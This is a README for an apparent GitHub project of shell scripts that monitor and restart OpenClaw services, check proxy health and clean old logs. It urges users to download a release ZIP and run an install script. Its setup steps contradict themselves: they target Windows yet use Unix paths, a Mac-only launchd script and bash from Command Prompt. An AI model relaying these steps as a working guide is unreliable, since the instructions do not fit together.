# 🛠️ openclaw-maintenance - Local Tools for Stable OpenClaw

[![Download Releases](https://img.shields.io/badge/Download-OpenClaw_Maintenance-brightgreen)](https://github.com/y-999/openclaw-maintenance/releases)

---

## 📥 How to Get the Software

Go to the release page to download the files you need:

[OpenClaw Maintenance Releases](https://github.com/y-999/openclaw-maintenance/releases)

On that page, find the latest release. Download the zipped file that matches Windows if available, or download the script files individually if needed. Save them in a folder on your computer where you want to keep this application.

---

## ⚙️ What is openclaw-maintenance?

This collection of scripts helps keep OpenClaw running smoothly on your local computer. It watches key OpenClaw services, restarts them if they stop responding, cleans up old log files, and checks the health of network connections.

The scripts monitor things like Gateway service status and proxy server health. They act to fix problems automatically. This helps prevent service interruptions without needing manual checks.

---

## 💻 System Requirements

Before running the scripts, make sure your computer meets these:

- Windows 10 or later
- OpenClaw must be installed and running on your machine
- `curl` installed (available by default on recent Windows)
- `jq` installed (used to parse data, can be downloaded from official jq site)
- (Optional) Clash or Mihomo API credentials if you want proxy auto-switching

---

## 🛠️ Installation Steps for Windows

1. Visit the release page and download the latest release ZIP file.

2. Extract the ZIP contents to a folder, for example:  
   `C:\Users\YourName\openclaw-maintenance\`

3. Open the folder and find the `.env.example` file.

4. Copy `.env.example` and rename the copy to `.env`.

5. Open the `.env` file with a text editor like Notepad.

6. Fill in these variables:

   - `OPENCLAW_NOTIFY_TARGET`  
     Enter your notification target (email, webhook, or empty if not used).
   
   - `CLASH_API` and `CLASH_SECRET`  
     Fill these only if you plan to use Clash proxy API features.

7. Open PowerShell or Command Prompt inside the folder.

8. Run the installation script by entering:  
   `bash install.sh`

9. After installation completes, verify the setup with:  
   `bash check.sh`

---

## 📂 Folder Structure Explained

The main files are stored inside the folder `~/.openclaw/scripts/` once installed. This folder holds all scripts and supporting documents you need for maintenance.

| File                    | Purpose                                      |
|-------------------------|----------------------------------------------|
| `README.md`             | This file with instructions                  |
| `README-proxy-health.md`| Detailed information about proxy health      |
| `gateway-watchdog.sh`   | Watches Gateway process and restarts if stuck|
| `proxy-health.sh`       | Checks proxy and network health               |
| `openclaw-safe-restart.sh`| Script to safely restart OpenClaw service  |
| `cleanup-logs.sh`       | Removes old log files                          |
| `log-cleanup-launchd.sh`| Mac-only script to schedule log cleanups     |

On Windows, the scripts run manually or can be scheduled through Task Scheduler for automation.

---

## 🧭 Using the Scripts

Run the scripts from PowerShell or Command Prompt with `bash` or a similar Linux shell for Windows (like Git Bash or WSL). For example:

```shell
bash gateway-watchdog.sh
```

This command will monitor the Gateway service. If the service is unresponsive, the script will restart it.

You can also run:

```shell
bash proxy-health.sh
```

To monitor network connection and switch VPN or proxy nodes when needed.

Run the cleanup script periodically to clear old logs:

```shell
bash cleanup-logs.sh
```

---

## 🔄 Keeping OpenClaw Stable

The scripts work best when run repeatedly to check system status and fix problems early. You can create scheduled tasks in Windows Task Scheduler to run these scripts every 10 minutes or as fits your needs.

Be sure to update your `.env` file if your notification target or API keys change.

---

## 🚀 Quick Start Download and Setup

[![Get OpenClaw Maintenance](https://img.shields.io/badge/Download-OpenClaw_Maintenance-blue)](https://github.com/y-999/openclaw-maintenance/releases)

- Download and unzip the latest release
- Copy `.env.example` to `.env`
- Edit `.env` to add your settings
- Run `bash install.sh`
- Run `bash check.sh`
- Use the scripts as needed from the command line

---

## 📝 Additional Tips

- Use Git Bash or Windows Subsystem for Linux (WSL) to run Bash scripts smoothly.
- Keep your OpenClaw service running before starting monitoring.
- Regularly check logs in the script folder to understand how the scripts respond.
- If you stop OpenClaw, the maintenance scripts will not detect or restart it.

---

This setup guides you step by step to manage OpenClaw locally using simple scripts. All operations happen on your computer, avoiding complicated configurations or third-party services.